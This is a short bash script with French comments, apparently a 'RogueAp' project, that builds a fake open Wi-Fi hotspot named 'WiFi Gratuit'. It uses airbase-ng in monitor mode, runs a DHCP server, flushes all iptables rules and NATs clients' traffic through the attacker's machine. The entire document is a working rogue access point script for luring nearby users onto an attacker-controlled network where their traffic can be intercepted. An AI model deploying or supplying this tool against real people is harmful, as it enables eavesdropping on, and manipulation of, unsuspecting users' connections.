#!/bin/bash

#Projet RogueAp

#Create a fake access point first !

#Interface réseau :
NET_IFACE=eth0
ROGUE_IFACE=wlan0

LOG_FILE=/tmp/log.txt

# Nettoyage des processus et des fichiers
# Les redirections &> sont là pour ne rien afficher à  l'écran

rm /tmp/udhcpd.* &> /dev/null
rm $LOG_FILE &> /dev/null
killall airbase-ng &> /dev/null
killall udhcpd &> /dev/null
airmon-ng stop wlan0mon &> /dev/null

# Installation de udhcpd et génération de sa config
echo "Installation de Udhcpd"
echo "(Ca peut prendre un peu de temps...)"
# Pour utiliser le script sous Kali 1.0, décommenter la ligne suivante
#apt-get update &>> $LOG_FILE
apt-get install udhcpd &>> $LOG_FILE
echo "max_leases 10
start 192.168.2.10
end 192.168.2.20
interface at0
domain local
option dns 8.8.8.8
option subnet 255.255.255.0
option router 192.168.2.1
lease 7200
lease_file /tmp/udhcpd.leases" > /tmp/udhcpd.conf
touch /tmp/udhcpd.leases &>> $LOG_FILE

#Création du réseau WiFi
echo "Démarage du réseau WiFi"
airmon-ng start $ROGUE_IFACE &>> $LOG_FILE
airbase-ng -c 11 -e 'WiFi Gratuit' wlan0mon &>> $LOG_FILE &
sleep 5
ifconfig at0 up
ifconfig at0 192.168.2.1 netmask 255.255.255.0 &>> $LOG_FILE
# Démarrage du DHCP et du Transfert de trafic
echo "Démarrage du serveur DHCP"
udhcpd /tmp/udhcpd.conf &>> $LOG_FILE
echo 1 > /proc/sys/net/ipv4/ip_forward


#Regles Iptables :

# Effacer toutes les règles IpTables pour ne garder que les bonnes
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Activer le transfert vers l'interface $NET_IFACE
iptables -t nat -A POSTROUTING -o $NET_IFACE -j MASQUERADE
echo "Le réseau est opérationnel !"

